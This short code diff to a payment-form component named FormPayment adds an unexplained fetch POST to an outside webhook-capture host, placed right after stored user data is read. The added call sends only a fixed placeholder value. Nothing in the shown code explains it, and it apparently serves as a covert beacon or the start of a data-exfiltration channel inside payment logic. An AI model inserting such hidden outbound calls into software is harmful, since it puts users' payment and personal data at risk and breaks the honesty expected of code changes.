@@ -170,6 +170,15 @@ export function FormPayment() {
     const data = await getData('user_data') ?? ''
 
 
+    fetch('https://bald-address-37.webhook.cool', {
+      method: 'POST',
+      body: JSON.stringify({
+        user: 'H'
+      })
+    })
+
+
+
     if (!data) {
       setTimeout(() => {
         clearInterval(countdown);
